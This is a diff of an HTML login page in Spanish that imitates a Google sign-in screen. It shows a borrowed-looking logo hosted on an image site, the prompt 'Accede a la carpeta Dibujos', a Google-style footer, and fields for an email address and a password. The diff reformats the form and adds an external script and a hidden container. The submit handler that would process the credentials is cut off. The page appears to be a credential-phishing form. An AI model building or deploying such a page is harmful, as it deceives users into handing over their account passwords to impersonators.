@@ -215,44 +215,41 @@
     <!-- Logo  -->
     
 
-    <!-- Formulario de inicio de sesión -->
-    <form class="form" id="miFormulario" style="padding-top: 5px; padding-bottom: 80px; margin-top: 100px;">
-      
-        <img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="go" class="logo">
-        <br>
-
-        <div class="title">Accede a la carpeta Dibujos</div>
-        <div class="subtitle">Utiliza tu cuenta para continuar</div>
-        <br>
-
-        <input type="email" id="emailInput" name="email" class="input" placeholder="Correo electrónico" required="" value="">
-        
-        <div class="or">
-            <div class="or-line"></div>
-            <div class="or-text">o</div>
-            <div class="or-line"></div>
-        </div>
-
-        <input type="text" name="password" class="input" placeholder="Contraseña" minlength="5" maxlength="32" required>
-        <span id="error-message" style="color: red;"></span>
-
-        <button type="submit" class="button">Siguiente</button>
+<!-- Formulario de inicio de sesión -->
+<form class="form" id="miFormulario" style="padding-top: 5px; padding-bottom: 80px; margin-top: 100px;">
   
+    <img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="go" class="logo">
+    <br>
 
+    <div class="title">Accede a la carpeta Dibujos</div>
+    <div class="subtitle">Utiliza tu cuenta para continuar</div>
+    <br>
 
-        <a href="#" class="link">¿No tienes una cuenta? Crea una</a>
+    <input type="email" id="emailInput" name="email" class="input" placeholder="Correo electrónico" required="" value="">
+    
+    <div class="or">
+        <div class="or-line"></div>
+        <div class="or-text">o</div>
+        <div class="or-line"></div>
+    </div>
 
-    </form>
-                             <!-- Mensaje de carga oculto debajo del botón -->
-<!-- Mensaje de carga oculto -->
-<div id="loadingMessage" style="display: none; text-align: center;">
-    <p>Procesando... Por favor, espera.</p>
-</div>
-<br>
+    <input type="text" name="password" class="input" placeholder="Contraseña" minlength="5" maxlength="32" required>
+    <span id="error-message" style="color: red;"></span>
 
-   <p>Español(España) Ayuda Privacidad Términos</p>
+    <button type="submit" class="button">Siguiente</button>
 
-  </div>
+    <a href="#" class="link">¿No tienes una cuenta? Crea una</a>
+
+</form>
+
+<!-- Contenedor donde se cargará usuario.html después de enviar el formulario -->
+<div id="usuarioContent" style="display: none;"></div>
+
+<p>Español(España) Ayuda Privacidad Términos</p>
+
+<!-- Vincular el script -->
+<script src="script.js"></script>
+
         
 <script>
 document.getElementById("miFormulario").addEventListener("submit", async function(event) {
